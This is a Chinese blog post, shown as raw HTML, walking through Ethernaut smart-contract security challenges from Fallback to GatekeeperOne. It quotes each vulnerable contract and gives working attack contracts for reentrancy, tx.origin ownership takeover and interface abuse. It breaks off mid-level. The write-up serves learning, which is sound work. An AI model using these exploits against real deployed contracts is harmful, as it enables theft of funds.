<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ethernaut | lsq</title><meta name="author" content="lsq"><meta name="copyright" content="lsq"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="ethernaut Fallback&#x2F;&#x2F; SPDX-License-Identifier: MIT pragma solidity ^0.8.0;  contract Fallback &amp;#123;      mapping(address &#x3D;&gt; uint) public contributions;     address public owner;      constructor()">
<meta property="og:type" content="article">
<meta property="og:title" content="ethernaut">
<meta property="og:url" content="http://example.com/2023/10/10/ethernaut/index.html">
<meta property="og:site_name" content="lsq">
<meta property="og:description" content="ethernaut Fallback&#x2F;&#x2F; SPDX-License-Identifier: MIT pragma solidity ^0.8.0;  contract Fallback &amp;#123;      mapping(address &#x3D;&gt; uint) public contributions;     address public owner;      constructor()">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img0.baidu.com/it/u=3431118657,348133440&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=281">
<meta property="article:published_time" content="2023-10-10T11:47:06.000Z">
<meta property="article:modified_time" content="2024-04-15T13:14:47.955Z">
<meta property="article:author" content="lsq">
<meta property="article:tag" content="标签1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img0.baidu.com/it/u=3431118657,348133440&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=281"><link rel="shortcut icon" href="https://img2.baidu.com/it/u=3673566212,1440065658&fm=253&fmt=auto&app=138&f=PNG?w=751&h=500"><link rel="canonical" href="http://example.com/2023/10/10/ethernaut/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ethernaut',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-15 21:14:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/construct.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://www.fomal.cc/static/css/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=1478036750,1488409170&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=800&amp;h=500" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img0.baidu.com/it/u=3431118657,348133440&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=281')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">lsq</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><!--span=' '+_p('search.title')--></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ethernaut</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-10T11:47:06.000Z" title="Created 2023-10-10 19:47:06">2023-10-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-04-15T13:14:47.955Z" title="Updated 2024-04-15 21:14:47">2024-04-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/solidity-learning/">solidity learning</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>35min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ethernaut"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ethernaut"><a href="#ethernaut" class="headerlink" title="ethernaut"></a>ethernaut</h1><hr>
<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback &#123;

    mapping(address =&gt; uint) public contributions;
    address public owner;

    constructor() &#123;
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    &#125;

    modifier onlyOwner &#123;
            require(
                msg.sender == owner,
                &quot;caller is not the owner&quot;
            );
            _;
        &#125;

    function contribute() public payable &#123;
        require(msg.value &lt; 0.001 ether);
        contributions[msg.sender] += msg.value;
        if(contributions[msg.sender] &gt; contributions[owner]) &#123;
        owner = msg.sender;
        &#125;
    &#125;

    function getContribution() public view returns (uint) &#123;
        return contributions[msg.sender];
    &#125;

    function withdraw() public onlyOwner &#123;
        payable(owner).transfer(address(this).balance);
    &#125;

    receive() external payable &#123;
        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
        owner = msg.sender;
    &#125;
    &#125;  
</code></pre><p>题目要求：<br>1.成为owner<br>2.合约余额成为零<br>对于如何获得owner 可以看到在contribute函数中 当贡献的ether大于上一任owner的贡献 就会变为owner<br>但是在receive中 如果贡献不等于0并且msg.value不为零 那么直接获得owner<br>receive函数在合约接受eth时触发 那么我们要做的就是<br>1.contribute 1 wei<br>2.像合约中转入1 wei<br>3.调用withdraw<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="e1.png" alt="e1"><br>经过这些操作 owner已经是我们自己 余额也被我们提走了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="e1.2.png" alt="e1.2"></p>
<h2 id="FallOut"><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2><p>代码  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;

contract Fallout &#123;

    using SafeMath for uint256;
    mapping (address =&gt; uint) allocations;
    address payable public owner;


    /* constructor */
    function Fal1out() public payable &#123;
        owner = msg.sender;
        allocations[owner] = msg.value;
    &#125;

    modifier onlyOwner &#123;
                require(
                    msg.sender == owner,
                    &quot;caller is not the owner&quot;
                );
                _;
            &#125;

    function allocate() public payable &#123;
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    &#125;

    function sendAllocation(address payable allocator) public &#123;
        require(allocations[allocator] &gt; 0);
        allocator.transfer(allocations[allocator]);
    &#125;

    function collectAllocations() public onlyOwner &#123;
        msg.sender.transfer(address(this).balance);
    &#125;

    function allocatorBalance(address allocator) public view returns (uint)&#123;
        return allocations[allocator];
    &#125;
&#125;  
</code></pre><p>这个合约的问题在于 旧版的构造函数为与合约名称相同的函数，但是在0.6.0构造函数已经成为 constructor<br>所以我们每个人都可以任意调用Fallout函数成为owner然后调用collectAllcations<br>所以要做的：<br>1.调用fallout<br>2.调用collectAllcations<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2.png" alt="2">  </p>
<h2 id="CoinFlip"><a href="#CoinFlip" class="headerlink" title="CoinFlip"></a>CoinFlip</h2><p>代码  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip &#123;

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() &#123;
        consecutiveWins = 0;
    &#125;

    function flip(bool _guess) public returns (bool) &#123;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) &#123;
        revert();
        &#125;

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) &#123;
        consecutiveWins++;
        return true;
        &#125; else &#123;
        consecutiveWins = 0;
        return false;
        &#125;
    &#125;
&#125;  
</code></pre><p>题目要求：<br>连续猜对十次<br>这题考的是伪随机数漏洞<br>我们可以在攻击合约中先计算blockValue<br>然后根据计算结果再调用flip<br>由于两个交易时间相差很近 所以很大概率在一个区块中 那么值就不随机 成了可以计算的数<br>flip就很大概率成功<br>调用十次attack<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="3.png" alt="3">  </p>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone &#123;

    address public owner;

    constructor() &#123;
        owner = msg.sender;
    &#125;

    function changeOwner(address _owner) public &#123;
        if (tx.origin != msg.sender) &#123;
        owner = _owner;
        &#125;
    &#125;
&#125;
</code></pre><p>代码：  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

    contract Telephone &#123;

    address public owner;

    constructor() &#123;
        owner = msg.sender;
    &#125;

    function changeOwner(address _owner) public &#123;
        if (tx.origin != msg.sender) &#123;
        owner = _owner;
        &#125;
    &#125;
&#125;
</code></pre><p>题目要求：<br>成为owner<br>这题考察tx.origin和msg.sender的区别<br>tx.origin是交易最初的发起方  msg.sender是调用者的地址<br>比如 用户a 调用 合约a 来调用合约b<br>那么在b中 合约b的msg.sender为合约a 但是tx.origin为用户a<br>那么这一题的完成方式就很简单  用一个中间合约带哦有changeOwner就可以了<br>攻击合约：<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>interface telephone&#123;
    function changeOwner(address _owner) external;
&#125;

contract telephoneAttack&#123;
    address target;
    constructor(address _target) public&#123;
        target = _target;
    &#125;

    function attack(address owner) public &#123;
        telephone(target).changeOwner(owner);
    &#125;
&#125;
</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="4.png" alt="4"></p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>代码</p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token &#123;

    mapping(address =&gt; uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public &#123;
        balances[msg.sender] = totalSupply = _initialSupply;
    &#125;

    function transfer(address _to, uint _value) public returns (bool) &#123;
        require(balances[msg.sender] - _value &gt;= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    &#125;

    function balanceOf(address _owner) public view returns (uint balance) &#123;
        return balances[_owner];
    &#125;
&#125;
</code></pre><p>题目要求：获得尽量大的余额  </p>
<p>观察transfer函数balances[msg.sender] - _value &gt;= 0存在下溢<br>我们初始有20个代币 那我们转21个就可以让balance的值成为uint256的最大值获得大量余额<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="5.png" alt="5"></p>
<h2 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h2><p>代码：<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract Delegate &#123;

    address public owner;

    constructor(address _owner) &#123;
        owner = _owner;
    &#125;

    function pwn() public &#123;
        owner = msg.sender;
    &#125;
    &#125;

    contract Delegation &#123;

    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) &#123;
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    &#125;

    fallback() external &#123;
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) &#123;
        this;
        &#125;
    &#125;
&#125;
</code></pre><p>题目要求：<br>成为owner<br>题目直接交互的合约是delegation<br>这里考delegatecall，一个合约调用delegatecall的时候，实行目标合约的逻辑 但是环境还是本合约的 也就是说逻辑改变的合约状态应该是本合约的<br>两个合约的owner占用相应的储存槽一样 那么delegation的delegatecall调用pwn改变的owner其实是delegation的owner<br>那么我们要做的：<br>1.构造msg.data<br>2.触发fallback<br>data 如何构造？<br>我们要调用一个函数 就要用它的函数选择器和传入的参数进行拼接，构造data在发送交易时传入，但是这个pwn没有参数 所以只需传入函数选择器就行<br>fallback函数如何触发？<br>两个条件会触发fallback<br>1.接受到eth且无receive函数<br>2.调用了合约不存在的函数<br>bytes public data = abi.encodeWithSignature(“pwn()”);</p>
<p>算出 data 为 0xdd365b8b<br>然后发送交易传data就行啦<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="6.png" alt="6"></p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>题目是个空合约 ，要求我们转入一些eth 但是这个合约没有fallback和recieve 不能接受eth<br>有一个方法可以强制给一个地址转入eth<br>那就是selfdestruct<br>可以在合约自毁前把余额强制转给传入的address  </p>
<h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><p>代码  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault &#123;
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) &#123;
        locked = true;
        password = _password;
    &#125;

    function unlock(bytes32 _password) public &#123;
        if (password == _password) &#123;
        locked = false;
        &#125;
    &#125;
&#125;
</code></pre><p>题目要求我们获得password 但他是private 我们不能访问<br>但是这个数据是储存在链上的，链上的信息都是公开的<br>我们可以借助web3.js查询链上合约插槽找到 password<br>可以看到locked占据插槽0<br>password占据插槽1  直接查插槽1<br>然后调unlock<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="7.png" alt="7"></p>
<h2 id="Reentrance"><a href="#Reentrance" class="headerlink" title="Reentrance"></a>Reentrance</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.6.12;</p>
<pre><code>import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;

contract Reentrance &#123;

    using SafeMath for uint256;
    mapping(address =&gt; uint) public balances;

    function donate(address _to) public payable &#123;
        balances[_to] = balances[_to].add(msg.value);
    &#125;

    function balanceOf(address _who) public view returns (uint balance) &#123;
        return balances[_who];
    &#125;

    function withdraw(uint _amount) public &#123;
        if(balances[msg.sender] &gt;= _amount) &#123;
        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);
        if(result) &#123;
            _amount;
        &#125;
        balances[msg.sender] -= _amount;
        &#125;
    &#125;

    receive() external payable &#123;&#125;
&#125;  
</code></pre><p>代码的问题在于withdraw的时候先进行转账再进行余额减少  所以如果我们在fallback中重复调用withdraw  产生重入<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface re{<br>        function donate(address _to) external;<br>        function withdraw(uint _amount) external;<br>    }<br>    contract attack{<br>        address target;<br>        uint amount;<br>        uint count;<br>        constructor(address _target) public payable{<br>            target = _target;<br>        }<br>        function Attack(uint _amount) public payable{<br>            target.call{value: msg.value}(abi.encodeWithSelector(re.donate.selector,address(this)));<br>            amount = _amount;<br>            re(target).withdraw(amount);<br>        }<br>        fallback() external payable{<br>            if(count == 0){<br>                re(target).withdraw(amount);<br>                count++;<br>            }<br>        }<br>    }</p>
<p>调用attack传入目标合约余额 就可以完成挑战<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="8.png" alt="8"></p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>interface Building &#123;
    function isLastFloor(uint) external returns (bool);
&#125;


contract Elevator &#123;
    bool public top;
    uint public floor;

    function goTo(uint _floor) public &#123;
        Building building = Building(msg.sender);

        if (! building.isLastFloor(_floor)) &#123;
        floor = _floor;
        top = building.isLastFloor(floor);
        &#125;
    &#125;
&#125;
</code></pre><p>要完成这个题要使top为true 要完成函数逻辑 需要函数第一次返回false 第二次返回true<br>可以设一个count 第一次返回false 第二次返回true  </p>
<p>// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>interface goto{<br>     function goTo(uint _floor) external;</p>
<p>}<br>contract firstAttack{<br>    address target;<br>    int count = 0;<br>    constructor(address _target) public{<br>        target = _target;<br>    }<br>    function attack() public {<br>        goto(target).goTo(1);<br>    }</p>
<pre><code>function isLastFloor(uint) external returns (bool)&#123;
    if(count == 0)&#123;
        count++;
        return false;
    &#125;
    else&#123;
        return true;
    &#125;
&#125;
</code></pre><p>}</p>
<p>调用attack 可完成挑战<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="9.png" alt="9"></p>
<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract Privacy &#123;

    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) &#123;
        data = _data;
    &#125;

    function unlock(bytes16 _key) public &#123;
        require(_key == bytes16(data[2]));
        locked = false;
    &#125;

    /*
        A bunch of super advanced solidity algorithms...

        ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
        .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
        *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
        `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
        ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
    */
&#125;
</code></pre><p>这题考链上数据的储存规则<br>要我们找到data【2】插槽位置<br>由于data是定长数据类型 符合顺序储存<br>如果按一个数据类型占用一个插槽的话那么data【2】应该在插槽7  但是经过查询发现在插槽5<br>明显uin8 uint8 uint16的数据存在打包  联合占用了一个插槽  具体请看solidity文档<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="10.png" alt="10"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="10.2.png" alt="10.2">  </p>
<h2 id="gateKeeperOne"><a href="#gateKeeperOne" class="headerlink" title="gateKeeperOne"></a>gateKeeperOne</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract GatekeeperOne &#123;

    address public entrant;

    modifier gateOne() &#123;
        require(msg.sender != tx.origin);
        _;
    &#125;

    modifier gateTwo() &#123;
        require(gasleft() % 8191 == 0);
        _;
    &#125;

    modifier gateThree(bytes8 _gateKey) &#123;
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);
        _;
    &#125;

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;
        entrant = tx.origin;
        return true;
    &#125;
&#125;
</code></pre><p>要通过大门 我们必须通过三道防卫（函数修饰符）<br>第一个要求很容易 只需要我们通过合约调用函数就可以<br>第三个要求涉及数据类型转换 要我们构造符合要求的key<br>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)))<br> 要求key取后四位和后八位结果一致<br>require(uint32(uint64(_gateKey)) != uint64(_gateKey))<br>要求key取后八位和key原来的结果不一致<br>require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)))<br>要求key的四位是我们自己恶的地址<br>我的地址为0x34B91dA4A48DdE39d19A0DEecF3616aba752210C<br>那么我根据自己地址构造出来的key就是  0x111111110000210c</p>
